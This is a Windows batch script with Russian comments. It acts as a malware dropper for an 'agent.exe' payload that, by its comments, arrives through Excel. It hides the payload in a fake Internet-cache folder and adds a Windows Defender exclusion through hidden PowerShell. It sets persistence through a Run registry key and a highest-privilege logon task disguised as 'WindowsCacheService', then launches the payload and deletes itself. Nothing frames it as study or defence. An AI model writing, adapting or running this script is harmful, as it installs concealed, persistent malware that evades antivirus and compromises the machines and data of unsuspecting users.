@echo off
:: Устанавливаем правильную кодировку для путей с кириллицей
chcp 65001 >nul

set "targetDir=%LOCALAPPDATA%\Microsoft\Windows\INetCache\Cache"
set "exeName=agent.exe"

:: Создаем папку и делаем её скрытой
if not exist "%targetDir%" mkdir "%targetDir%"
attrib +h +s "%targetDir%" >nul 2>&1

:: Копируем файл из текущей папки (куда его скачал Excel) в системную
copy /Y "%~dp0%exeName%" "%targetDir%\%exeName%" >nul 2>&1
attrib +h +s "%targetDir%\%exeName%" >nul 2>&1

:: Добавляем в исключения антивируса (нужны права админа, которые даст Excel)
powershell -NoP -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath '%targetDir%' -Force" >nul 2>&1

:: Автозагрузка через реестр и планировщик
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCacheService" /t REG_SZ /d "\"%targetDir%\%exeName%\"" /f >nul 2>&1
schtasks /create /tn "WindowsCacheService" /tr "\"%targetDir%\%exeName%\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1

:: Запускаем уже установленный агент из его новой папки
start "" /B "%targetDir%\%exeName%"

:: Самоудаление батника через 3 секунды
(goto) 2>nul & del "%~f0"
